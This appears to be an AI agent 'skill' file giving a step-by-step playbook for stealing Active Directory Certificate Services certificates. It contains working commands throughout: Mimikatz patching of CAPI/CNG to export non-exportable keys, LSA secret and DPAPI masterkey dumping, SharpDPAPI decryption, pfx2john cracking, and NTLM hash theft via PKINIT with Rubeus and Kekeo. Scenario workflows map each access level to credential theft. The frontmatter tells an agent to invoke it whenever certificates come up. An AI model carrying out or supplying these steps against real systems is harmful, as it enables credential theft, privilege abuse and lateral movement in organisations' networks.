---
name: ad-cs-certificate-theft
description: How to steal and abuse Active Directory Certificate Services (AD CS) certificates. Use this skill whenever you need to extract, decrypt, or abuse certificates in a Windows/AD environment, including user certificates, machine certificates, certificate files, or NTLM credential theft via PKINIT. Make sure to use this skill when you mention certificates, AD CS, PKINIT, DPAPI, Mimikatz, SharpDPAPI, or any certificate-related attack in Active Directory.
---

# AD CS Certificate Theft

This skill covers the five primary methods for stealing and abusing certificates in Active Directory Certificate Services (AD CS) environments, based on the SpecterOps "Certified Pre-Owned" research.

## Quick Reference

| Method | Target | Key Tool | Privilege Required |
|--------|--------|----------|-------------------|
| THEFT1 | User/Machine Certs | Mimikatz, CertStealer | Interactive session |
| THEFT2 | User Certs | SharpDPAPI, Mimikatz | User context |
| THEFT3 | Machine Certs | SharpDPAPI, Mimikatz | SYSTEM |
| THEFT4 | File-based Certs | PowerShell, pfx2john | File access |
| THEFT5 | NTLM via PKINIT | Kekeo, Rubeus | Valid cert |

---

## THEFT1: Exporting Certificates Using Crypto APIs

**When to use:** You have an interactive desktop session and want to export certificates with private keys.

### Manual Export (GUI)

1. Open `certmgr.msc`
2. Navigate to the certificate
3. Right-click → All Tasks → Export
4. Generate password-protected .pfx file

### Programmatic Export

**PowerShell:**
```powershell
$CertPath = "C:\path\to\cert.pfx"
$CertPass = "P@ssw0rd"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
$Cert.EnhancedKeyUsageList
```

**Check certificate usage:**
```cmd
certutil.exe -dump -v cert.pfx
```

### Bypassing Non-Exportable Keys

If the private key is non-exportable, use Mimikatz to patch the APIs:

```cmd
# Patch CAPI in current process
crypto::capi

# Patch CNG in lsass.exe memory
crypto::cng

# Then export the certificate
crypto::certificates /export /systemstore:CURRENT_USER
```

**Tools:**
- [TheWover/CertStealer](https://github.com/TheWover/CertStealer) - C# project using CAPI/CNG
- Mimikatz `crypto::capi` and `crypto::cng` commands

---

## THEFT2: User Certificate Theft via DPAPI

**When to use:** You need to extract user certificates and their private keys from the certificate store.

### Understanding the Storage

| Component | Location |
|-----------|----------|
| User Certificates | `HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates` |
| Alternative Cert Location | `%APPDATA%\Microsoft\SystemCertificates\My\Certificates` |
| CAPI Private Keys | `%APPDATA%\Microsoft\Crypto\RSA\User SID\` |
| CNG Private Keys | `%APPDATA%\Microsoft\Crypto\Keys\` |

### Extraction Process

1. **Select the target certificate** from the user's store and retrieve its key store name
2. **Locate the required DPAPI masterkey** to decrypt the private key
3. **Decrypt the private key** using the plaintext DPAPI masterkey

### Acquiring the DPAPI Masterkey

**With Mimikatz (in user's context):**
```cmd
dpapi::masterkey /in:"C:\PATH\TO\KEY" /rpc
```

**With Mimikatz (if password is known):**
```cmd
dpapi::masterkey /in:"C:\PATH\TO\KEY" /sid:accountSid /password:PASS
```

### Using SharpDPAPI (Recommended)

SharpDPAPI automates the decryption process:

```cmd
# Decrypt certificates using masterkey file
SharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt

# Decrypt using password
SharpDPAPI.exe certificates /password:USER_PASSWORD

# Decrypt using specific masterkey
SharpDPAPI.exe certificates /pvk:PRIVATE_KEY_GUID
```

### Converting PEM to PFX

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

---

## THEFT3: Machine Certificate Theft via DPAPI

**When to use:** You need to extract machine certificates (requires SYSTEM privileges).

### Understanding Machine Certificate Storage

| Component | Location |
|-----------|----------|
| Machine Certificates | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates` |
| CAPI Private Keys | `%ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\RSA\MachineKeys` |
| CNG Private Keys | `%ALLUSERSPROFILE%\Application Data\Microsoft\Crypto\Keys` |

**Important:** Machine certificates are encrypted with the **DPAPI_SYSTEM LSA secret**, which only SYSTEM can access. They cannot be decrypted with the domain's DPAPI backup key.

### Manual Decryption with Mimikatz

```cmd
# Extract DPAPI_SYSTEM LSA secret
lsadump::secrets

# Export machine certificates after patching
crypto::certificates /export /systemstore:LOCAL_MACHINE
```

### Automated Approach with SharpDPAPI

```cmd
# Requires elevated permissions, escalates to SYSTEM automatically
SharpDPAPI.exe certificates /machine
```

This command:
1. Escalates to SYSTEM
2. Dumps the DPAPI_SYSTEM LSA secret
3. Decrypts machine DPAPI masterkeys
4. Uses plaintext keys to decrypt machine certificate private keys

---

## THEFT4: Finding Certificate Files

**When to use:** You want to search for certificate files on the filesystem.

### Certificate File Extensions

| Extension | Description |
|-----------|-------------|
| `.pfx`, `.p12`, `.pkcs12` | PKCS#12 files (certificate + private key) |
| `.pem` | PEM-encoded certificate/key |
| `.key` | Private key only |
| `.crt`, `.cer` | Certificate only (no private key) |
| `.csr` | Certificate Signing Request (no cert or key) |
| `.jks`, `.keystore`, `.keys` | Java Keystores |

### Search for Certificate Files

**PowerShell:**
```powershell
Get-ChildItem -Recurse -Path C:\Users\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.crt, *.cer, *.csr, *.jks, *.keystore, *.keys
```

**Command Prompt:**
```cmd
findstr /s /i /m "*.pfx" C:\Users\*
```

### Cracking Password-Protected PKCS#12 Files

If you find a password-protected .pfx file:

```bash
# Extract hash using pfx2john.py
pfx2john.py certificate.pfx > hash.txt

# Crack with JohnTheRipper
john --wordlist=passwords.txt hash.txt
```

**Tool:** [pfx2john.py](https://fossies.org/dox/john-1.9.0-jumbo-1/pfx2john_8py_source.html)

---

## THEFT5: NTLM Credential Theft via PKINIT

**When to use:** You have a valid certificate and want to extract NTLM hashes via PKINIT authentication.

### Understanding the Attack

When PKINIT is used for authentication:
1. The KDC returns the user's NTLM one-way function (OWF) in the PAC
2. The NTLM hash is stored in the `PAC_CREDENTIAL_INFO` buffer
3. This enables extraction of NTLM hashes from TGTs obtained via PKINIT

### Using Kekeo

```cmd
tgt::pac /caname:generic-DC-CA /subject:genericUser /castore:current_user /domain:domain.local
```

**Tool:** [Kekeo](https://github.com/gentilkiwi/kekeo)

### Using Rubeus

```cmd
Rubeus.exe asktgt /user:username /certificate:cert.pfx /password:password /domain:domain.local /getcredentials
```

**Tool:** [Rubeus](https://github.com/GhostPack/Rubeus)

### Smartcard-Protected Certificates

If the certificate is smartcard-protected, you need the PIN:

**Tool:** [PinSwipe](https://github.com/CCob/PinSwipe)

---

## Quick Workflow Guide

### Scenario 1: You have interactive access to a user session
1. Try THEFT1 first (easiest if keys are exportable)
2. If keys are non-exportable, use Mimikatz `crypto::capi` or `crypto::cng`
3. Alternatively, use SharpDPAPI for automated extraction

### Scenario 2: You have SYSTEM access
1. Use THEFT3 to extract machine certificates
2. Run `SharpDPAPI.exe certificates /machine`
3. Or use Mimikatz `crypto::certificates /export /systemstore:LOCAL_MACHINE`

### Scenario 3: You're hunting for certificates
1. Use THEFT4 to search filesystem for certificate files
2. Check common locations: Downloads, file shares, user profiles
3. If password-protected, use pfx2john.py + JohnTheRipper

### Scenario 4: You have a valid certificate
1. Use THEFT5 to extract NTLM hashes via PKINIT
2. Use Kekeo or Rubeus with `/getcredentials`
3. This gives you the user's NTLM hash for further attacks

---

## Verification

After extracting a certificate, verify its capabilities:

```powershell
$CertPath = "C:\path\to\cert.pfx"
$CertPass = "P@ssw0rd"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
$Cert.EnhancedKeyUsageList
```

Or:
```cmd
certutil.exe -dump -v cert.pfx
```

---

## References

- [SpecterOps Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Kekeo](https://github.com/gentilkiwi/kekeo)
- [CertStealer](https://github.com/TheWover/CertStealer)
- [PinSwipe](https://github.com/CCob/PinSwipe)
